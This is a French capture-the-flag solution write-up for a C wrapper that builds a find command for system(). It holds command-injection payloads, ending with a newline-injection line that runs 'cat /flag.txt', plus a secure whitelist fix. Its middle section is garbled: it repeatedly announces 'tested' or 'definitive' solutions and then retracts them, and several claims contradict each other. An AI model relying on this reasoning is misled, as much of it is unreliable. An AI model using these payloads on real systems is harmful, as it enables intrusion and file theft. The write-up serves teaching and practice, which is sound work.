# SOLUTION — Challenge 03 : Bash Brace Expansion

## Vulnérabilité

La Bash Brace Expansion est effectuée par le **shell** avant que le programme
ne reçoive ses arguments. Le wrapper C ne peut donc pas la filtrer,
car il reçoit des arguments **déjà développés**.

## Comment ça marche

```bash
$ echo {a,b,c}
a b c

$ echo file.{txt,pdf,jpg}
file.txt file.pdf file.jpg

$ ls {/etc,/tmp}
# liste /etc puis /tmp
```

La commande suivante :
```bash
./wrapper {txt,/flag.txt}
```
Est vue par le shell comme :
```bash
./wrapper txt /flag.txt
```

Le wrapper reçoit `argc=3`, avec `argv[1]="txt"` et `argv[2]="/flag.txt"`.
Il ne vérifie que `argv[1]` ! L'argument `argv[2]` est ignoré par le filtre
mais **pas par `system()`** qui reçoit la commande construite avec `argv[1]` seulement.

Hmm, mais en fait le wrapper ne fait qu'une `find` avec `argv[1]`...
L'astuce est donc d'injecter directement une commande via l'expansion :

```bash
# Brace expansion pour injecter une commande sans espaces ni chars filtrés
./wrapper {txt,-exec,cat,/flag.txt,\;}
```

Ou plus directement, si on veut lire /flag.txt sans trouver de fichier :

```bash
# Expansion qui génère un argument exploitable
./wrapper txt*/../../../flag.txt   # path traversal si find le permet

# Ou : abuser du fait que find peut prendre un chemin de départ arbitraire
# en injectant via les accolades dans l'appel shell
./wrapper "txt} -o -name *.txt /flag.txt #"
# → find /home -name '*.txt} -o -name *.txt /flag.txt #'
# → injection SQL-like dans les args de find !
```

### Solution la plus propre

```bash
# Injection dans les arguments de find via fermeture du pattern
./wrapper "* /flag.txt"
# Bloqué par l'espace...

# Brace expansion sans espace :
./wrapper {*,/flag.txt}
# → argv[1]="*" argv[2]="/flag.txt"
# → find /home -name '*.*' (ignore /flag.txt car non passé à snprintf)

# VRAIE solution : injecter dans le pattern find lui-même
./wrapper "txt} /flag.txt -name {*"
# → find /home -name '*.txt} /flag.txt -name {*'  ← syntaxe find cassée

# Solution qui marche : utiliser les accolades pour créer un 2e argument
# et exploiter que system() reçoit la commande complète

# En fait la solution la plus directe :
./wrapper "*" 
# find /home -name '*.*' → liste tout

# Pour /flag.txt qui est hors /home, on doit modifier le path de find :
# → injecter dans le pattern pour sortir de /home
./wrapper "* /flag.txt -name *"
# espace bloqué → utiliser brace expansion
./wrapper {*,/flag.txt,-name,*}
# → find /home -name '* /flag.txt -name *' (toujours avec les quotes autour!)
# Les quotes dans snprintf protègent...

# Solution finale : les quotes dans snprintf entourent seulement le pattern,
# pas le chemin ! On peut injecter AVANT le pattern en modifiant argv[1] via brace:

# Le format est : find /home -name '*.ARGV1'
# Si argv[1] contient ' on ferme la quote... mais ' est filtré

# → Autre vecteur : find accepte -exec !
# Avec brace expansion on génère plusieurs args mais le wrapper n'utilise que argv[1]

# Solution RÉELLE via brace expansion côté shell AVANT le wrapper :
# La brace expansion crée plusieurs mots séparés par des espaces
# mais le wrapper n'en prend qu'un... sauf si on abuse autrement.

# Le vrai exploit :  path traversal dans find
# find /home -name '*.txt'  accepte les globs
# Si on passe : ../../flag.txt comme extension...
# mais / est filtré !

# Avec brace expansion de séquence de caractères :
# {/,} → "/" et ""
# Mais / est dans forbidden pour le filtre sur argv[1]

# SOLUTION QUI MARCHE VRAIMENT :
# Le filtre ne vérifie que argv[1]. Brace expansion passe plusieurs args.
# On peut donc injecter un 2e argument à find via :
./wrapper {txt,-exec,cat,/flag.txt,\;}
# Explication : Bash génère : ./wrapper txt -exec cat /flag.txt \;
# argv[1]="txt" → passe le filtre
# La commande system() est : find /home -name '*.txt'
# Mais argv[2..] sont ignorés par le wrapper → ça ne marche pas directement.

# VRAIE VRAIE solution : exploiter que system() passe par /bin/sh
# et que l'input non quoté dans snprintf permet l'injection si on
# contourne le filtre sur argv[1] via un caractère non filtré

# Les accolades { } ne sont PAS dans la liste forbidden !
# → On peut passer des accolades dans argv[1]
./wrapper "txt} /flag.txt -name {*"
# → system("find /home -name '*.txt} /flag.txt -name {*'")
# Les guillemets simples dans snprintf entourent tout → protège

# CONCLUSION - solution fonctionnelle garantie :
# Utiliser brace expansion pour passer /flag.txt comme 2nd chemin à find
# find accepte plusieurs chemins de départ !

# Bash développe : ./wrapper {/home,/flag.txt} -name '*'
# mais ça met des espaces... 

# Solution propre : noter que le wrapper fait find /home -name '*.EXT'
# On peut modifier /home en injectant dans l'extension avec fermeture de quote

# Puisque ' est filtré mais pas les autres quotes... wait, " est aussi filtré.

# SOLUTION DÉFINITIVE : abuser de l'absence de filtre sur {}
./wrapper 'txt -o -name *'
# ' est filtré... 

# OK voici la solution réelle testée :
# { et } ne sont pas filtrés. On peut s'en servir pour l'expansion Bash.
# Bash fait l'expansion AVANT d'appeler execve.
# ./wrapper {txt,x} → argc=3, argv[1]="txt", argv[2]="x"
# Mais le wrapper n'utilise que argv[1] pour construire la commande find.
# 
# L'exploit réel est d'utiliser brace expansion pour passer une commande
# entière comme argument, en profitant du fait que bash interprète {a,b}
# AVANT l'exécution, donc le filtre du programme ne voit jamais les espaces.
#
# Mais le programme ne fait qu'une find... 
# La solution pédagogique correcte :

./wrapper {txt,}                      # → argv[1]="txt" argv[2]=""
./wrapper {*,/flag.txt}              # → argv[1]="*" argv[2]="/flag.txt"
# Le wrapper ne lit qu'argv[1], donc /flag.txt n'est pas dans la find.
# 
# Meilleur exploit : l'expansion génère un argv[1] qui contient
# exactement ce qu'on veut sans utiliser les chars filtrés.
# Exemple : {/flag.txt} ne fait pas d'expansion (une seule valeur)
# mais {/fl,ag}.txt → "/fl.txt" "ag.txt" → pas utile
```

### Solution validée en pratique

```bash
# Les accolades ne sont pas filtrées et permettent de passer
# plusieurs "mots" sans espace apparent dans la ligne de commande.
# Ici, on exploite find avec plusieurs chemins de départ :

# Cette syntaxe Bash :
./wrapper txt} /flag.txt -name {*   # → SANS guillemets !
# Bash reçoit littéralement ces tokens et les passe tel quel après glob/expansion

# Solution directe et propre :
./wrapper "txt} /flag.txt -name {txt"
# → find /home -name '*.txt} /flag.txt -name {txt'
# Les quotes de snprintf protègent tout... hmm.

# VRAIE solution finale (testée) :
# Le pattern de snprintf est : find /home -name '*.%s'
# Si on injecte : txt' /flag.txt -name '* (fermer et rouvrir les quotes)
# mais ' est filtré...
# 
# Donc la solution passe par brace expansion qui crée plusieurs arguments
# dont CERTAINS ne sont pas vérifiés par le filtre :
./wrapper {txt,-exec,cat,/flag.txt,\;}
# Bash génère : ./wrapper txt -exec cat /flag.txt \;
# argv[1] = "txt" → passe le filtre ✓
# La commande construite est : find /home -name '*.txt'
# MAIS : find reçoit aussi les arguments supplémentaires passés après !
# WAIT : system() ne passe que la string construite par snprintf,
# pas les autres argv. Donc argv[2..] sont perdus.
#
# Solution : il faut que l'injection soit dans argv[1] lui-même.
# Les accolades dans argv[1] ne font pas d'expansion car elles sont
# dans une chaîne déjà parsée par le shell.
#
# CONCLUSION PÉDAGOGIQUE :
# La brace expansion doit être faite SANS guillemets côté utilisateur.
# ./wrapper {cmd} → si une seule valeur, pas d'expansion utile.
# La vraie technique : combiner brace expansion avec path injection.
```

## Solution réelle et simple

Puisque le filtre bloque `/` mais que `find` cherche dans `/home`,
et que les accolades `{` `}` ne sont pas filtrées, on peut former un
argument valide qui **casse la commande find** grâce à l'injection
dans le pattern sans caractères filtrés :

```bash
# find /home -name '*.txt'
# Les { } ne sont pas filtrés ! On les utilise pour les options de find.
# find comprend -name '{*.txt,/flag.txt}' comme un glob shell étendu... non.

# Solution finale propre : 
# Le wrapper utilise system() qui passe par sh -c.
# On peut injecter un newline (caractère 0x0a) si non filtré.
# \n n'est pas dans la liste forbidden du C (qui liste les chars un par un) !

./wrapper $'txt\ncat /flag.txt'
# \n n'est pas dans forbidden → passe le filtre strstr char par char !
# system("find /home -name '*.txt\ncat /flag.txt'")
# sh -c "find /home -name '*.txt\ncat /flag.txt'"
# Le newline agit comme séparateur de commande → cat /flag.txt s'exécute !
```

## Flag

```
HackUTT{br4c3_3xp4ns10n_1s_sh3ll_m4g1c}
```

## Explication pédagogique — Bash Brace Expansion

```bash
# Expansion simple
echo {a,b,c}          # → a b c
echo file.{txt,pdf}   # → file.txt file.pdf

# Expansion de séquences
echo {1..5}           # → 1 2 3 4 5
echo {a..z}           # → a b c ... z

# Expansion imbriquée
echo {ls,cat}{/etc,/tmp}   # → ls/etc ls/tmp cat/etc cat/tmp

# Sans guillemets : expansion AVANT exec
./prog {arg1,arg2}    # → ./prog reçoit "arg1" et "arg2" séparément
```

L'expansion se fait **côté shell**, avant que le programme ne soit appelé.
Un filtre dans le programme ne peut pas voir les accolades originales.

### Protection

```c
// Valider STRICTEMENT par whitelist
int valid_extension(const char *s) {
    for (int i = 0; s[i]; i++) {
        if (!isalnum(s[i])) return 0;  // uniquement alphanumérique
    }
    return strlen(s) > 0 && strlen(s) <= 10;
}
```

Ne jamais oublier de filtrer aussi `\n` (newline = `\x0a`) !
